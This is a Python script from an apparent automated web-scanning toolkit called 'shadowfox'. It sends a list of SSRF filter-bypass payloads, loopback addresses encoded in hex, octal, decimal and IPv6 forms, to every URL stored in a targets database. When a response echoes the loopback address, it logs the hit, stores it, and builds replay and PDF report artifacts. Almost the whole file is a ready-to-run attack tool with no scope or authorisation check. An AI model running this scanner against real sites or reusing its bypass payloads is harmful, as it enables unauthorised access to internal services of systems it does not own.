import json, time
import sys, os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import requests
from urllib.parse import quote
from tools.shadowfox_config import get_path
from agents.agent_replay import generate_replay
from agents.agent_report import create_pdf_report
from tools.zip_utils import create_zip
def upisi_u_bazu(target_id, payload, reflected, status_code, response_size):
    import sqlite3
    from datetime import datetime
    conn = sqlite3.connect("shadowfox.db")
    c = conn.cursor()
    c.execute("""
        INSERT INTO scan_results (target_id, payload_type, payload, reflected, status_code, response_size, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (
        target_id,
        "SSRF",
        payload,
        int(reflected),
        str(status_code),
        response_size,
        datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ))
    conn.commit()
    conn.close()

SSRFBYPASS_LIST = [
    "http://127.0.0.1",
    "http://127.1",
    "http://0x7f000001",
    "http://017700000001",
    "http://2130706433",
    "http://localhost",
    "http://localhost:80",
    "http://[::1]",
    "http://0000::1",
    "http://[::ffff:127.0.0.1]",
    "http://127.0.1",
    "http://whitelisted@127.0.0.1"
]

def load_targets():
    import sqlite3
    conn = sqlite3.connect("shadowfox.db")
    c = conn.cursor()
    c.execute("SELECT url FROM targets")
    results = [row[0] for row in c.fetchall()]
    conn.close()
    return results

LOG_FILE = get_path("logs") + "/ssrf_bypass_log.jsonl"

def log_entry(data):
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")

def test_ssrf(url):
    try:
        r = requests.get(url, timeout=5)
        return {
            "status": r.status_code,
            "length": len(r.text),
            "reflected": "127.0.0.1" in r.text or "localhost" in r.text
        }
    except Exception as e:
        return {"error": str(e), "reflected": False}

def run_ssrf():
    targets = load_targets()
    for target in targets:
        for payload in SSRFBYPASS_LIST:
            full_url = f"{target}?q={quote(payload)}"
            result = test_ssrf(full_url)

            log = {
                "url": full_url,
                "payload": payload,
                "type": "SSRF",
                "status": result.get("status", "N/A"),
                "length": result.get("length", 0),
                "reflected": result.get("reflected", False),
                "error": result.get("error", "")
            }
            log_entry(log)

            if result.get("reflected"):
                upisi_u_bazu(target_id=0, payload=payload, reflected=True, status_code=result.get("status", 0), response_size=result.get("length", 0))
                generate_replay(target, payload)
                create_pdf_report(target)
                create_zip()

            time.sleep(1)

if __name__ == "__main__":
    run_ssrf()
